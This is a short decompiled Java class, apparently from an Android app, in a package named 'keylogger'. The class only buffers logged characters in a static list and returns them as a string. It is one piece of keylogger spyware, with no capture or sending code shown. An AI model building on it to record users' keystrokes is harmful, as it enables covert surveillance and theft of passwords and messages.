package com.example.keylogger;

import java.util.ArrayList;
import java.util.Iterator;

/* loaded from: classes9.dex */
public class KeyLogs {
    public static ArrayList<Character> Logs = new ArrayList<>();

    public static void AddString(String str) {
        for (char ch2 : str.toCharArray()) {
            Logs.add(Character.valueOf(ch2));
        }
    }

    public static void Add(Character key) {
        Logs.add(key);
    }

    public static void Empty() {
        ArrayList<Character> arrayList = Logs;
        arrayList.removeAll(arrayList);
    }

    public static String GetLog() {
        StringBuilder builder = new StringBuilder(Logs.size());
        Iterator<Character> it = Logs.iterator();
        while (it.hasNext()) {
            Character ch2 = it.next();
            builder.append(ch2);
        }
        return builder.toString();
    }
}